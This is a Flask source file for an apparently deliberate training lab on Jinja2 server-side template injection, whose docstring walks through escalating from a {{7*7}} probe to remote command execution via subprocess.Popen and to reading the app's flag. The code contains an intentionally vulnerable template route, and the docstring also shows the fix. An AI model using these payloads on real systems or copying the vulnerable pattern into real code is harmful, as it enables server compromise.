"""
Lab 07 -- Server-Side Template Injection (Jinja2).

The /hello endpoint renders a Jinja2 template with user input baked
DIRECTLY into the template source -- not as a variable. Classic SSTI
that escalates to RCE because Jinja2's sandbox can reach Python's
object graph by walking `__class__.__mro__`.

Run:
    pip install flask
    python app.py

In Nullock:
    1. Browse /hello?name=world -- get "hello world".
    2. Send to Repeater. Change name to: {{7*7}}
       Response: "hello 49" -- confirmed template injection.
    3. Escalate: name to ?name={{''.__class__.__mro__[1].__subclasses__()}}
       Response: list of every Python class loaded -- look for
       'subprocess.Popen' in the output.
    4. Find its index N. Then name to
       ?name={{''.__class__.__mro__[1].__subclasses__()[N]("id",shell=True,stdout=-1).communicate()}}
       Response includes the output of `id` -- RCE achieved.
    5. Confirm success (no shell needed): GET /flag?name={{config.FLAG}}
       -- same raw-concatenation vuln as /hello, reading a secret out
       of the Flask app config via Jinja2's object graph. Proves SSTI
       reaches server-side state, not just arithmetic.
    6. Real fix: never bake user input INTO the template source. Use
       render_template_string("hello {{ name }}", name=user_input).
"""

import hashlib
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)
app.config["FLAG"] = "NULLOCK{%s}" % hashlib.sha256(b"lab-07-ssti").hexdigest()[:16]

@app.route("/hello")
def hello():
    name = request.args.get("name", "world")
    # VULN: user input concatenated into template source.
    template = f"hello {name}"
    return render_template_string(template)

@app.route("/flag")
def flag():
    name = request.args.get("name", "world")
    template = f"hello {name}"
    try:
        out = render_template_string(template)
    except Exception:
        return jsonify(solved=False), 400
    if app.config["FLAG"] in out:
        return jsonify(solved=True, flag=app.config["FLAG"])
    return jsonify(solved=False), 403

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5007, debug=False)
